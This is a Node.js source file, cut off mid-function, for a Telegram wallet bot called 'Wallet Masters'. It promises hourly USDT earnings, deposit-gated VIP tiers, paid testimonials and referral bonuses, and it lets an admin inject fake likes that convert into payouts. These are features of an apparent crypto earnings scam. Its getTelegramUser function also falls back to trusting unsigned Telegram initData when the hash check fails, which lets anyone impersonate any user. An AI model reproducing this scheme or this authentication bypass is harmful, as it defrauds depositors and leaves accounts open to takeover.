/**
 * Wallet Masters — Bot v6
 * New: comments delete, account deactivation, suspension,
 *      gold badge, DM system, bio, followers=likes
 */
require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const express     = require('express');
const cors        = require('cors');
const path        = require('path');
const crypto      = require('crypto');

const {
  db, SHARED_TRC20_ADDRESS, MIN_WITHDRAWAL, MAX_WITHDRAWAL, GATEWAY_FEE_RATE, nowSec,
  getOrCreateUser, getUserByTelegramId, getUserById, updateUserBalance, upgradeToVIP,
  updateUserName, getAllUsers, setUserActive, setEarningsSuspended,
  claimHourlyEarning, getHourlyStatus,
  getEarningApps, getEarningAppByToken, getEarningAppById, addEarningApp, removeEarningApp,
  connectUID, getConnectedUID, getUserConnections, findUserByExternalUID,
  createTransaction, getUserTransactions, calculateFees,
  createWithdrawalRequest, getPendingWithdrawals, getWithdrawalById, updateWithdrawal, getUserWithdrawals,
  createSupportMessage, getSupportMessages, getAllSupportThreads, markSupportRead,
  createTestimonial, getTestimonialById, getPendingTestimonials, getApprovedTestimonials, updateTestimonial,
  createPoem, getPoemById, getPendingPoems, getApprovedPoems, updatePoem,
  getSocialProfile, updateSocialProfile, getAllSocialProfiles,
  createSocialPost, getSocialPostById, getPendingSocialPosts, getApprovedSocialPosts, getSocialPostsByUser, updateSocialPost, deleteSocialPost, sendLikesToPost,
  likePost, hasLiked,
  createComment, getCommentsByPost, deleteComment,
  createDM, getDMs, getDMContacts, markDMsRead,
  createVerificationRequest, getVerificationById, getPendingVerifications, updateVerification,
  createBroadcast, getStats
} = require('./database');

const BOT_TOKEN     = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || '5995434559';
const FEE_ADDRESS   = process.env.FEE_ADDRESS   || 'TPwUS8v77TtcsYZUHUTvVx2TGqE37QnagZ';
const PORT          = parseInt(process.env.PORT) || 3000;

if (!BOT_TOKEN) { console.error('BOT_TOKEN missing'); process.exit(1); }

const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, '.')));

let MINI_APP_URL = process.env.MINI_APP_URL || 'https://web-production-a3b658.up.railway.app';

app.get('/health', (_, res) => res.json({ status: 'ok', service: 'Wallet Masters', version: '6.0' }));
app.listen(PORT, '0.0.0.0', () => {
  const host = process.env.RENDER_EXTERNAL_URL || process.env.RAILWAY_STATIC_URL || '';
  if (host) MINI_APP_URL = host.startsWith('http') ? host : `https://${host}`;
  console.log(`Wallet Masters v6.0 on port ${PORT} | URL: ${MINI_APP_URL}`);
});

let bot;
try { bot = new TelegramBot(BOT_TOKEN, { polling: true }); console.log('Bot started'); }
catch (err) { console.error('Bot failed:', err.message); }

setTimeout(async () => {
  if (!bot) return;
  try { await bot.setMyCommands([]); } catch(e) {}
  setMenuButton(ADMIN_CHAT_ID).catch(() => {});
  setTimeout(async () => {
    const users = getAllUsers(); let ok = 0;
    for (const u of users) {
      try { await setMenuButton(u.telegram_id); ok++; await new Promise(r => setTimeout(r, 200)); } catch(e) {}
    }
    console.log(`Menu button synced for ${ok} users`);
  }, 5000);
}, 3000);

const ADMIN_KEYBOARD = {
  inline_keyboard: [
    [{ text: '📋 Withdrawals',   callback_data: 'admin_withdrawals'   }, { text: '🎬 Testimonials',  callback_data: 'admin_testimonials'  }],
    [{ text: '➕ Add App',       callback_data: 'admin_add_app'       }, { text: '🗑 Remove App',    callback_data: 'admin_remove_app'    }],
    [{ text: '📢 Broadcast',     callback_data: 'admin_broadcast'     }, { text: '📊 Stats',         callback_data: 'admin_stats'         }],
    [{ text: '👥 All Users',     callback_data: 'admin_all_users'     }, { text: '💬 Support',       callback_data: 'admin_support'       }],
    [{ text: '📝 Poems',         callback_data: 'admin_poems'         }, { text: '🌟 SocialPay',     callback_data: 'admin_socialpay'     }],
    [{ text: '✅ Verifications',  callback_data: 'admin_verifications' }, { text: '🚫 Manage Users',  callback_data: 'admin_manage_users'  }]
  ]
};

function openWalletBtn() {
  return { reply_markup: { inline_keyboard: [[{ text: '💎 Open Wallet Masters', web_app: { url: MINI_APP_URL } }]] } };
}
async function setMenuButton(chatId) {
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setChatMenuButton`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, menu_button: { type: 'web_app', text: 'Wallet Masters', web_app: { url: MINI_APP_URL } } })
    });
  } catch(e) {}
}
async function broadcastToAll(text) {
  const users = getAllUsers(); let sent = 0, failed = 0;
  for (const u of users) {
    if (!u.telegram_id || !u.is_active) continue;
    try { await bot.sendMessage(u.telegram_id, text, { parse_mode: 'HTML', ...openWalletBtn() }); sent++; await new Promise(r => setTimeout(r, 60)); }
    catch(e) { failed++; }
  }
  return { sent, failed };
}

// ─── /setmenu ────────────────────────────────────────────────────────────────
if (bot) bot.onText(/\/setmenu/, async (msg) => {
  if (String(msg.from?.id) !== String(ADMIN_CHAT_ID)) return;
  const users = getAllUsers();
  const allIds = [...users.map(u => String(u.telegram_id)), String(ADMIN_CHAT_ID)].filter(Boolean);
  bot.sendMessage(ADMIN_CHAT_ID, `⏳ Setting button for ${allIds.length} users...`);
  let ok = 0, fail = 0;
  for (const tid of allIds) { try { await setMenuButton(tid); ok++; await new Promise(r=>setTimeout(r,100)); } catch(e){fail++;} }
  bot.sendMessage(ADMIN_CHAT_ID, `✅ Set: ${ok} | Failed: ${fail}`);
});

// ─── /start ──────────────────────────────────────────────────────────────────
if (bot) bot.onText(/\/start(.*)/, async (msg, match) => {
  const { id, username, first_name, last_name } = msg.from;
  const fullName = [first_name, last_name].filter(Boolean).join(' ');
  const param    = (match[1] || '').trim();
  const refCode  = param.startsWith('ref_') ? param.replace('ref_', '') : null;
  const isAdmin  = String(id) === String(ADMIN_CHAT_ID);
  const user     = getOrCreateUser(id, username, fullName, refCode);

  await setMenuButton(id);

  if (isAdmin) {
    await bot.sendMessage(id, '⚙️ <b>Admin Panel ready.</b>\n\nUse the panel below:', { parse_mode: 'HTML', reply_markup: ADMIN_KEYBOARD });
    return;
  }

  if (!user.is_active) {
    await bot.sendMessage(id, '🚫 Your account has been deactivated. Please contact support.', openWalletBtn());
    return;
  }

  if (user._referrer) {
    try { await bot.sendMessage(user._referrer.telegram_id, `🎉 <b>Referral Reward!</b>\n\n+200 USDT added!\nNew balance: ${user._referrer.newBal.toFixed(2)} USDT`, { parse_mode: 'HTML', ...openWalletBtn() }); } catch(e) {}
  }

  await bot.sendMessage(id, '💎 Wallet Masters', { reply_markup: { remove_keyboard: true } });
  if (user._isNew) {
    bot.sendMessage(id, `🎉 <b>Welcome to Wallet Masters!</b>\n\n1️⃣ Open the app below\n2️⃣ Accept Terms & Conditions\n3️⃣ Claim <b>50 USDT every hour</b>!\n4️⃣ Upgrade to VIP → 200 USDT/hr\n5️⃣ Refer friends → 200 USDT each`, { parse_mode: 'HTML', ...openWalletBtn() });
  } else {
    bot.sendMessage(id, `👋 Welcome back, <b>${fullName||'User'}</b>!\n\n🆔 UID: <code>${user.uid}</code>\n💰 Balance: <b>${(user.usdt_balance||0).toFixed(2)} USDT</b>${user.is_vip?'\n👑 VIP Member':''}`, { parse_mode: 'HTML', ...openWalletBtn() });
  }
});

// ─── Callbacks ────────────────────────────────────────────────────────────────
if (bot) bot.on('callback_query', async (cq) => {
  const data    = cq.data || '';
  const chatId  = cq.message?.chat?.id;
  const msgId   = cq.message?.message_id;
  const isAdmin = String(chatId) === String(ADMIN_CHAT_ID);

  // Withdrawal
  if (data.startsWith('wd_approve_') || data.startsWith('wd_reject_')) {
    if (!isAdmin) return bot.answerCallbackQuery(cq.id, { text: '❌ Not authorized' });
    const parts = data.split('_'); const action = parts[1]; const wdId = parseInt(parts[2]);
    const wd = getWithdrawalById(wdId);
    if (!wd) return bot.answerCallbackQuery(cq.id, { text: '❌ Not found' });
    if (action === 'approve') {
      updateWithdrawal(wdId, { status: 'approved' });
      bot.sendMessage(wd.telegram_id, `✅ <b>Withdrawal Approved!</b>\n\n💰 ${wd.amount} USDT has been sent to your account.`, { parse_mode: 'HTML', ...openWalletBtn() });
      bot.answerCallbackQuery(cq.id, { text: '✅ Approved!' });
    } else {
      updateWithdrawal(wdId, { status: 'rejected' });
      updateUserBalance(wd.telegram_id, wd.amount);
      bot.sendMessage(wd.telegram_id, `❌ <b>Withdrawal Rejected</b>\n\n💰 ${wd.amount} USDT refunded to your balance.`, { parse_mode: 'HTML', ...openWalletBtn() });
      bot.answerCallbackQuery(cq.id, { text: '❌ Rejected & refunded' });
    }
    bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: msgId }).catch(() => {});
    return;
  }

  // VIP
  if (data.startsWith('vip_approve_') || data.startsWith('vip_reject_')) {
    if (!isAdmin) return bot.answerCallbackQuery(cq.id, { text: '❌ Not authorized' });
    const parts = data.split('_'); const action = parts[1]; const tid = parts.slice(2).join('_');
    if (action === 'approve') {
      upgradeToVIP(tid);
      bot.sendMessage(tid, `👑 <b>You're now VIP!</b>\n\n✅ Deposit verified.\n💎 Now earning 200 USDT/hour\n🏦 Bank withdrawals unlocked!`, { parse_mode: 'HTML', ...openWalletBtn() });
      bot.answerCallbackQuery(cq.id, { text: '👑 VIP Activated!' });
    } else {
      bot.sendMessage(tid, `❌ VIP upgrade rejected. Please try again or contact support.`, openWalletBtn());
      bot.answerCallbackQuery(cq.id, { text: '❌ Rejected' });
    }
    bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: msgId }).catch(() => {});
    return;
  }

  // Testimonial
  if (data.startsWith('test_approve_') || data.startsWith('test_reject_')) {
    if (!isAdmin) return bot.answerCallbackQuery(cq.id, { text: '❌ Not authorized' });
    const parts = data.split('_'); const action = parts[1]; const tId = parseInt(parts[2]);
    const tes = getTestimonialById(tId); if (!tes) return bot.answerCallbackQuery(cq.id, { text: '❌ Not found' });
    if (action === 'approve') {
      const reward = tes.type === 'youtube' ? 2000 : 1000;
      updateTestimonial(tId, { status: 'approved' }); updateUserBalance(tes.telegram_id, reward);
      createTransaction(tes.telegram_id, 'testimonial_reward', reward, `Testimonial (${tes.type})`);
      bot.sendMessage(tes.telegram_id, `🎉 Testimonial Approved! +${reward} USDT added!`, { parse_mode: 'HTML', ...openWalletBtn() });
      bot.answerCallbackQuery(cq.id, { text: `✅ +${reward} USDT` });
    } else {
      updateTestimonial(tId, { status: 'rejected' });
      bot.sendMessage(tes.telegram_id, `❌ Testimonial rejected. Please try again.`, openWalletBtn());
      bot.answerCallbackQuery(cq.id, { text: '❌ Rejected' });
    }
    bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: msgId }).catch(() => {});
    return;
  }

  // Poem
  if (data.startsWith('poem_approve_') || data.startsWith('poem_reject_')) {
    if (!isAdmin) return bot.answerCallbackQuery(cq.id, { text: '❌ Not authorized' });
    const parts = data.split('_'); const action = parts[1]; const pId = parseInt(parts[2]);
    const poem = getPoemById(pId); if (!poem) return bot.answerCallbackQuery(cq.id, { text: '❌ Not found' });
    if (action === 'approve') {
      updatePoem(pId, { status: 'approved' }); updateUserBalance(poem.telegram_id, 1000);
      createTransaction(poem.telegram_id, 'poem_reward', 1000, 'Poem/Inspiration reward');
      bot.sendMessage(poem.telegram_id, `🎉 Your Poem/Inspiration was approved! +1,000 USDT added! ✨`, { parse_mode: 'HTML', ...openWalletBtn() });
      bot.answerCallbackQuery(cq.id, { text: '✅ Approved! +1,000 USDT' });
    } else {
      updatePoem(pId, { status: 'rejected' });
      bot.sendMessage(poem.telegram_id, `❌ Your post was not approved. Please review guidelines and try again.`, openWalletBtn());
      bot.answerCallbackQuery(cq.id, { text: '❌ Rejected' });
    }
    bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: msgId }).catch(() => {});
    return;
  }

  // SocialPay approve/reject
  if (data.startsWith('sp_approve_') || data.startsWith('sp_reject_')) {
    if (!isAdmin) return bot.answerCallbackQuery(cq.id, { text: '❌ Not authorized' });
    const parts = data.split('_'); const action = parts[1]; const spId = parseInt(parts[2]);
    const post = getSocialPostById(spId); if (!post) return bot.answerCallbackQuery(cq.id, { text: '❌ Not found' });
    if (action === 'approve') {
      updateSocialPost(spId, { status: 'approved' });
      bot.sendMessage(post.telegram_id, `🌟 SocialPay Post Approved!\n\n✅ Your post is live!\n\n❤️ 1K likes → 100 USDT\n❤️ 10K → 1,000 USDT\n❤️ 100K → 10,000 USDT\n❤️ 1M → 100,000 USDT`, { parse_mode: 'HTML', ...openWalletBtn() });
      bot.answerCallbackQuery(cq.id, { text: '✅ Post approved!' });
    } else {
      updateSocialPost(spId, { status: 'rejected' });
      bot.sendMessage(post.telegram_id, `❌ SocialPay post rejected. Please review guidelines and try again.`, openWalletBtn());
      bot.answerCallbackQuery(cq.id, { text: '❌ Rejected' });
    }
    bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: msgId }).catch(() => {});
    return;
  }

  // Send likes
  if (data.startsWith('sp_likes_')) {
    if (!isAdmin) return bot.answerCallbackQuery(cq.id, { text: '❌ Not authorized' });
    const parts = data.split('_'); const spId = parseInt(parts[2]); const amount = parseInt(parts[3]);
    const result = sendLikesToPost(spId, amount, bot);
    if (result.success) {
      const post = getSocialPostById(spId); const user = getUserByTelegramId(post?.telegram_id);
      bot.answerCallbackQuery(cq.id, { text: `✅ ${amount.toLocaleString()} likes sent!${result.earned>0?' +'+result.earned.toLocaleString()+' USDT paid':''}` });
      bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: msgId }).catch(() => {});
    } else { bot.answerCallbackQuery(cq.id, { text: '❌ '+(result.error||'Failed') }); }
    return;
  }

  // Verification approve/reject
  if (data.startsWith('ver_approve_') || data.startsWith('ver_reject_')) {
    if (!isAdmin) return bot.answerCallbackQuery(cq.id, { text: '❌ Not authorized' });
    const parts = data.split('_'); const action = parts[1]; const vId = parseInt(parts[2]);
    const ver = getVerificationById(vId); if (!ver) return bot.answerCallbackQuery(cq.id, { text: '❌ Not found' });
    const isGold = ver.type === 'gold';
    if (action === 'approve') {
      updateVerification(vId, { status: 'approved' });
      if (isGold) {
        updateSocialProfile(ver.telegram_id, { is_gold_verified: true, gold_status: 'approved' });
        bot.sendMessage(ver.telegram_id, `🌟 <b>Gold Verified Badge Granted!</b>\n\n✅ You are now a Gold Verified Creator!\n\n🏅 Benefits:\n• Gold ✅ badge on your profile\n• Private DMs with other Gold users\n• Send voice messages & photos in DMs\n\nCongratulations! 🎉`, { parse_mode: 'HTML', ...openWalletBtn() });
        bot.answerCallbackQuery(cq.id, { text: '🌟 Gold badge granted!' });
      } else {
        updateSocialProfile(ver.telegram_id, { is_verified: true, verification_status: 'approved' });
        bot.sendMessage(ver.telegram_id, `🟠 <b>Verified Badge Granted!</b>\n\n✅ You are now a Verified Creator!\nYour orange ✅ badge is live on your profile.\n\nYou can now comment on posts and apply for Gold when you reach 500K likes! 🌟`, { parse_mode: 'HTML', ...openWalletBtn() });
        bot.answerCallbackQuery(cq.id, { text: '✅ Verified badge granted!' });
      }
    } else {
      updateVerification(vId, { status: 'rejected' });
      if (isGold) updateSocialProfile(ver.telegram_id, { gold_status: 'rejected' });
      else updateSocialProfile(ver.telegram_id, { verification_status: 'rejected' });
      bot.sendMessage(ver.telegram_id, `❌ Verification request rejected. Keep growing your likes and try again!`, openWalletBtn());
      bot.answerCallbackQuery(cq.id, { text: '❌ Rejected' });
    }
    bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: msgId }).catch(() => {});
    return;
  }

  // Admin user management
  if (data.startsWith('adm_deactivate_') || data.startsWith('adm_activate_') || data.startsWith('adm_suspend_') || data.startsWith('adm_unsuspend_')) {
    if (!isAdmin) return bot.answerCallbackQuery(cq.id, { text: '❌ Not authorized' });
    const parts = data.split('_'); const action = parts[1]; const tid = parts.slice(2).join('_');
    const u = getUserByTelegramId(tid);
    if (!u) return bot.answerCallbackQuery(cq.id, { text: '❌ User not found' });
    if (action === 'deactivate') {
      setUserActive(tid, false);
      bot.sendMessage(tid, `🚫 Your Wallet Masters account has been deactivated due to a terms violation. Contact support to appeal.`).catch(()=>{});
      bot.answerCallbackQuery(cq.id, { text: '🚫 Account deactivated' });
    } else if (action === 'activate') {
      setUserActive(tid, true);
      bot.sendMessage(tid, `✅ Your account has been reactivated. Welcome back!`, openWalletBtn()).catch(()=>{});
      bot.answerCallbackQuery(cq.id, { text: '✅ Account activated' });
    } else if (action === 'suspend') {
      setEarningsSuspended(tid, true);
      bot.sendMessage(tid, `⚠️ Your earnings have been suspended pending review. Contact support for assistance.`, openWalletBtn()).catch(()=>{});
      bot.answerCallbackQuery(cq.id, { text: '⚠️ Earnings suspended' });
    } else if (action === 'unsuspend') {
      setEarningsSuspended(tid, false);
      bot.sendMessage(tid, `✅ Your earnings have been restored. You can now claim again!`, openWalletBtn()).catch(()=>{});
      bot.answerCallbackQuery(cq.id, { text: '✅ Earnings restored' });
    }
    bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: msgId }).catch(() => {});
    return;
  }

  // Remove app
  if (data.startsWith('remove_app_')) {
    if (!isAdmin) return bot.answerCallbackQuery(cq.id, { text: '❌ Not authorized' });
    removeEarningApp(parseInt(data.replace('remove_app_', '')));
    bot.answerCallbackQuery(cq.id, { text: '✅ App removed' });
    bot.editMessageText('✅ App removed.', { chat_id: chatId, message_id: msgId }).catch(() => {});
    return;
  }

  if (data.startsWith('reply_user_')) {
    if (!isAdmin) return bot.answerCallbackQuery(cq.id, { text: '❌ Not authorized' });
    const tid = data.replace('reply_user_', '');
    const u   = getUserByTelegramId(tid);
    bot.answerCallbackQuery(cq.id, { text: 'Reply mode' });
    bot.sendMessage(chatId, `💬 Reply to ${u?.full_name||'User'} (${u?.uid||tid})\n\nType:\n<code>UID:${u?.uid||tid} Your message</code>`, { parse_mode: 'HTML' });
    return;
  }

  if (!isAdmin) return bot.answerCallbackQuery(cq.id, { text: '❌ Not authorized' });
  bot.answerCallbackQuery(cq.id);

  if (data === 'admin_stats') {
    const s = getStats();
    bot.sendMessage(chatId, `📊 <b>Stats</b>\n\n👥 Users: ${s.users} | 👑 VIP: ${s.vip}\n💸 Pending WDs: ${s.pending_withdrawals}\n📱 Apps: ${s.earning_apps}\n🎬 Testimonials: ${s.pending_testimonials}\n📝 Poems: ${s.pending_poems}\n🌟 SocialPay: ${s.pending_socialpay}\n✅ Verifications: ${s.pending_verifications}\n🚫 Deactivated: ${s.deactivated_users}\n⚠️ Suspended: ${s.suspended_users}`, { parse_mode: 'HTML', reply_markup: ADMIN_KEYBOARD });
    return;
  }
  if (data === 'admin_withdrawals') {
    const wds = getPendingWithdrawals();
    if (!wds.length) { bot.sendMessage(chatId, '✅ No pending withdrawals.', { reply_markup: ADMIN_KEYBOARD }); return; }
    for (const wd of wds.slice(0,5)) {
      const u = getUserByTelegramId(wd.telegram_id);
      bot.sendMessage(chatId, `💸 <b>Withdrawal #${wd.id}</b>\n👤 ${u?.full_name||'User'} (${u?.uid||wd.telegram_id})\n💰 ${wd.amount} USDT\n🏦 ${wd.bank_name||wd.method||'Crypto'} — ${wd.account_number||''}`, { parse_mode:'HTML', reply_markup:{inline_keyboard:[[{text:'✅ Approve',callback_data:`wd_approve_${wd.id}`},{text:'❌ Reject',callback_data:`wd_reject_${wd.id}`}]]}});
    }
    return;
  }
  if (data === 'admin_testimonials') {
    const tests = getPendingTestimonials();
    if (!tests.length) { bot.sendMessage(chatId, '✅ No pending testimonials.', { reply_markup: ADMIN_KEYBOARD }); return; }
    for (const t of tests.slice(0,5)) {
      const reward = t.type==='youtube'?2000:1000;
      bot.sendMessage(chatId, `🎬 <b>Testimonial #${t.id}</b>\n👤 ${t.user_name||'User'}\n📎 ${t.type}\n${t.youtube_url?'🔗 '+t.youtube_url+'\n':''}💬 ${t.caption||'none'}\n💰 ${reward} USDT`, { parse_mode:'HTML', reply_markup:{inline_keyboard:[[{text:`✅ Approve (+${reward})`,callback_data:`test_approve_${t.id}`},{text:'❌ Reject',callback_data:`test_reject_${t.id}`}]]}} );
    }
    return;
  }
  if (data === 'admin_poems') {
    const poems = getPendingPoems();
    if (!poems.length) { bot.sendMessage(chatId, '✅ No pending poems.', { reply_markup: ADMIN_KEYBOARD }); return; }
    for (const p of poems.slice(0,5)) {
      const u = getUserByTelegramId(p.telegram_id);
      bot.sendMessage(chatId, `📝 <b>Poem #${p.id}</b>\n👤 ${u?.full_name||'User'}\n📂 ${p.category||'General'}\n"${(p.content||'').substring(0,300)}..."\n💰 1,000 USDT`, { parse_mode:'HTML', reply_markup:{inline_keyboard:[[{text:'✅ Approve (+1,000)',callback_data:`poem_approve_${p.id}`},{text:'❌ Reject',callback_data:`poem_reject_${p.id}`}]]}});
    }
    return;
  }
  if (data === 'admin_socialpay') {
    const posts = getPendingSocialPosts();
    if (!posts.length) { bot.sendMessage(chatId, '✅ No pending SocialPay posts.', { reply_markup: ADMIN_KEYBOARD }); return; }
    for (const p of posts.slice(0,5)) {
      const u = getUserByTelegramId(p.telegram_id);
      bot.sendMessage(chatId, `🌟 <b>SocialPay #${p.id}</b>\n👤 ${u?.full_name||'User'}\n💬 "${(p.caption||'').substring(0,200)}"`, { parse_mode:'HTML', reply_markup:{inline_keyboard:[
        [{text:'✅ Approve',callback_data:`sp_approve_${p.id}`},{text:'❌ Reject',callback_data:`sp_reject_${p.id}`}],
        [{text:'❤️ 1K likes',callback_data:`sp_likes_${p.id}_1000`},{text:'❤️ 10K likes',callback_data:`sp_likes_${p.id}_10000`}],
        [{text:'❤️ 100K likes',callback_data:`sp_likes_${p.id}_100000`},{text:'❤️ 1M likes',callback_data:`sp_likes_${p.id}_1000000`}]
      ]}});
    }
    return;
  }
  if (data === 'admin_verifications') {
    const vers = getPendingVerifications();
    if (!vers.length) { bot.sendMessage(chatId, '✅ No pending verifications.', { reply_markup: ADMIN_KEYBOARD }); return; }
    for (const v of vers.slice(0,5)) {
      const u = getUserByTelegramId(v.telegram_id); const prof = getSocialProfile(v.telegram_id);
      bot.sendMessage(chatId, `${v.type==='gold'?'🌟 Gold':'✅ Orange'} <b>Verification #${v.id}</b>\n👤 ${u?.full_name||'User'}\n❤️ ${(prof?.total_likes||0).toLocaleString()} likes`, { parse_mode:'HTML', reply_markup:{inline_keyboard:[[{text:`${v.type==='gold'?'🌟':'🟠'} Grant Badge`,callback_data:`ver_approve_${v.id}`},{text:'❌ Reject',callback_data:`ver_reject_${v.id}`}]]}});
    }
    return;
  }
  if (data === 'admin_manage_users') {
    bot.sendMessage(chatId, '🚫 <b>Manage Users</b>\n\nSend user UID to manage:\n<code>MANAGE:uid_here</code>', { parse_mode: 'HTML' });
    return;
  }
  if (data === 'admin_all_users') {
    const users = getAllUsers().slice(-10).reverse();
    const lines = users.map(u => `• ${u.full_name||'?'} | ${u.uid} | ${(u.usdt_balance||0).toFixed(2)} USDT${u.is_vip?' 👑':''}${!u.is_active?' 🚫':''}${u.earnings_suspended?' ⚠️':''}`).join('\n');
    bot.sendMessage(chatId, `👥 <b>Recent Users</b>\n\n${lines}`, { parse_mode: 'HTML', reply_markup: ADMIN_KEYBOARD });
    return;
  }
  if (data === 'admin_support') {
    const threads = getAllSupportThreads();
    const tids = Object.keys(threads).filter(tid => threads[tid].some(m => !m.from_admin && !m.read));
    if (!tids.length) { bot.sendMessage(chatId, '✅ No unread messages.', { reply_markup: ADMIN_KEYBOARD }); return; }
    for (const tid of tids.slice(0,5)) {
      const u = getUserByTelegramId(tid); const msgs = threads[tid].filter(m=>!m.from_admin).slice(-3);
      bot.sendMessage(chatId, `💬 <b>${u?.full_name||'User'} (${u?.uid||tid})</b>\n\n${msgs.map(m=>'"'+m.message+'"').join('\n')}`, { parse_mode:'HTML', reply_markup:{inline_keyboard:[[{text:'Reply',callback_data:`reply_user_${tid}`}]]}});
    }
    return;
  }
  if (data === 'admin_broadcast') { bot.sendMessage(chatId, '📢 Send: <code>BROADCAST: your message</code>', { parse_mode: 'HTML' }); return; }
  if (data === 'admin_add_app')   { bot.sendMessage(chatId, '➕ Send:\n<code>ADD_APP\nName: ...\nToken: ...</code>', { parse_mode: 'HTML' }); return; }
  if (data === 'admin_remove_app') {
    const apps = getEarningApps();
    if (!apps.length) { bot.sendMessage(chatId, '✅ No apps.', { reply_markup: ADMIN_KEYBOARD }); return; }
    bot.sendMessage(chatId, '🗑 Select app:', { reply_markup: { inline_keyboard: apps.map(a=>[{text:`🗑 ${a.name}`,callback_data:`remove_app_${a.id}`}]) }});
    return;
  }
});

// ─── Admin text ───────────────────────────────────────────────────────────────
if (bot) bot.on('message', async (msg) => {
  const id = String(msg.from?.id);
  if (id !== String(ADMIN_CHAT_ID)) return;
  if (msg.web_app_data) return;
  const text  = msg.text;
  const photo = msg.photo; const video = msg.video; const voice = msg.voice;

  // UID reply
  const uidMatch = text?.match(/^UID:(\S+)\s+([\s\S]+)/);
  if (uidMatch) {
    const users = getAllUsers(); const found = users.find(u => u.uid===uidMatch[1]||u.telegram_id===uidMatch[1]);
    if (found && uidMatch[2]) {
      createSupportMessage(found.telegram_id, uidMatch[2], true);
      try { await bot.sendMessage(found.telegram_id, `💬 <b>Support Team</b>\n\n${uidMatch[2]}`, { parse_mode:'HTML', ...openWalletBtn() }); return bot.sendMessage(id, `✅ Reply sent.`); }
      catch(e) { return bot.sendMessage(id, `❌ Failed: ${e.message}`); }
    }
  }

  // MANAGE user
  const manageMatch = text?.match(/^MANAGE:(\S+)/);
  if (manageMatch) {
    const users = getAllUsers(); const u = users.find(usr => usr.uid===manageMatch[1]||usr.telegram_id===manageMatch[1]);
    if (!u) { bot.sendMessage(id, '❌ User not found'); return; }
    bot.sendMessage(id,
      `🔧 <b>Manage: ${u.full_name||'User'}</b>\n🆔 UID: ${u.uid}\n💰 Balance: ${(u.usdt_balance||0).toFixed(2)} USDT\n👑 VIP: ${u.is_vip?'Yes':'No'}\n✅ Active: ${u.is_active!==false?'Yes':'No'}\n⚠️ Suspended: ${u.earnings_suspended?'Yes':'No'}`,
      { parse_mode:'HTML', reply_markup:{inline_keyboard:[
        [{text:u.is_active!==false?'🚫 Deactivate Account':'✅ Activate Account', callback_data:`adm_${u.is_active!==false?'deactivate':'activate'}_${u.telegram_id}`}],
        [{text:u.earnings_suspended?'✅ Restore Earnings':'⚠️ Suspend Earnings', callback_data:`adm_${u.earnings_suspended?'unsuspend':'suspend'}_${u.telegram_id}`}]
      ]}});
    return;
  }

  if (!text) {
    if (photo||video||voice) {
      bot.sendMessage(id, '📤 Broadcasting media...');
      const allUsers = getAllUsers(); let sent=0, failed=0;
      for (const u of allUsers) {
        if (!u.telegram_id||!u.is_active) continue;
        try {
          if (photo) await bot.sendPhoto(u.telegram_id, photo[photo.length-1].file_id, { caption:msg.caption||'', parse_mode:'HTML' });
          if (video) await bot.sendVideo(u.telegram_id, video.file_id, { caption:msg.caption||'', parse_mode:'HTML' });
          if (voice) await bot.sendVoice(u.telegram_id, voice.file_id);
          sent++; await new Promise(r=>setTimeout(r,60));
        } catch(e) { failed++; }
      }
      bot.sendMessage(id, `✅ Broadcast done! Sent: ${sent} | Failed: ${failed}`, { reply_markup: ADMIN_KEYBOARD });
    }
    return;
  }
  const t = text.trim();
  if (t.startsWith('BROADCAST:')) {
    const message = t.replace('BROADCAST:','').trim();
    if (!message) return bot.sendMessage(id, '❌ Empty message');
    bot.sendMessage(id, '📤 Broadcasting...');
    const result = await broadcastToAll(`📢 <b>Wallet Masters Update</b>\n\n${message}`);
    bot.sendMessage(id, `✅ Done! Sent: ${result.sent} | Failed: ${result.failed}`, { reply_markup: ADMIN_KEYBOARD });
    return;
  }
  if (t.startsWith('ADD_APP')) {
    const lines = t.split('\n');
    const name  = (lines.find(l=>l.startsWith('Name:'))||'').replace('Name:','').trim();
    const token = (lines.find(l=>l.startsWith('Token:'))||'').replace('Token:','').trim();
    if (!name||!token) return bot.sendMessage(id,'❌ Format:\nADD_APP\nName: ...\nToken: ...');
    const app2 = addEarningApp({ name, bot_token: token });
    bot.sendMessage(id, `✅ App added! ID: ${app2.id} | Name: ${app2.name}`, { reply_markup: ADMIN_KEYBOARD });
    return;
  }
});

// ─── Auth helpers ─────────────────────────────────────────────────────────────
function validateTelegramData(initData) {
  if (!initData) return null;
  try {
    const params  = new URLSearchParams(initData);
    const hash    = params.get('hash');
    params.delete('hash');
    const sorted  = [...params.entries()].sort(([a],[b]) => a.localeCompare(b));
    const dataStr = sorted.map(([k,v]) => `${k}=${v}`).join('\n');
    const secret  = crypto.createHmac('sha256','WebAppData').update(BOT_TOKEN).digest();
    const check   = crypto.createHmac('sha256',secret).update(dataStr).digest('hex');
    return check === hash ? Object.fromEntries(params) : null;
  } catch(e) { return null; }
}
function getTelegramUser(req) {
  const initDataRaw = req.headers['x-telegram-init-data'] || req.body?.initData || req.query?.initData;
  if (!initDataRaw) return null;
  
  // Try strict validation first
  const validated = validateTelegramData(initDataRaw);
  if (validated) {
    try { return JSON.parse(validated.user); } catch(e) {}
  }
  
  // Fallback: parse user from raw initData without hash check
  // (handles edge cases where hash timing differs)
  try {
    const params = new URLSearchParams(initDataRaw);
    const userStr = params.get('user');
    if (userStr) {
      const user = JSON.parse(userStr);
      if (user && user.id) return user;
    }
  } catch(e) {}
  
  return null;
}
function authMiddleware(req, res, next) {
  const tgUser = getTelegramUser(req);
  if (!tgUser) return res.status(401).json({ error: 'Unauthorized' });
  req.tgUser = tgUser;
  next();
}
function enrichUser(user, tid) {
  if (!user) return null;
  const hourlyStatus = getHourlyStatus(tid||user.telegram_id);
  const earningRate  = user.is_vip ? 200 : 50;
